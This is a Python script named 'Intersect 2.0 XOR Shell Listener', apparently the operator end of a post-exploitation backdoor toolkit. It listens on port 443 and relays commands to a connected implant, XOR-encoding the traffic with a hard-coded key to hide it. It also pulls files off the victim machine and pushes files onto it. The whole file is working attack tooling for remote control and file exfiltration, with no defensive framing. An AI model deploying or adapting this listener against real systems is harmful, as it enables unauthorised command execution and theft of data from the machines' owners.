#!/usr/bin/python

# Intersect 2.0
# XOR Shell Listener
# trial version. don't expect this to work all that well.

import os, sys
import socket
from subprocess import Popen,PIPE,STDOUT,call

HOST = ''
PORT = 443
pin = 'XKIUKX'
socksize = 4096

def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
try:
    server.bind((HOST, PORT))
    server.listen(10)
    print "[+] Shell listening on 443"
    conn, addr = server.accept()
    print "[+] New Connection: %s" % addr[0]
except:
    print "[!] Connection closed."
    sys.exit(2)

while True:
    data = conn.recv(socksize)
    data2 = xor(data, pin)
    #print data2
    msg = raw_input(data2)
    cmd = xor(msg, pin)
    conn.sendall(str(cmd))
    if msg == ('killme'):
        print("[!] Shutting down shell!")
        conn.close()
        sys.exit(0)
    elif msg.startswith('download'):
        getname = msg.split(" ")
        rem_file = getname[1]
        filename = rem_file.replace("/","_")
        data = conn.recv(socksize)
        filedata = xor(data, pin)
        newfile = file(filename, "wb")
        newfile.write(filedata)
        newfile.close()
        if os.path.exists(filename) is True:
            print("[+] Download complete.")
            print("[+] File location: " + os.getcwd()+"/"+filename)
    elif msg.startswith('upload'):
	getname = msg.split(" ")
        loc_file = getname[1]
        sendfile = open(loc_file, "r")
        filedata = sendfile.read()
        sendfile.close()
        senddata = xor(filedata, pin)
        conn.sendall(senddata)


conn.close()


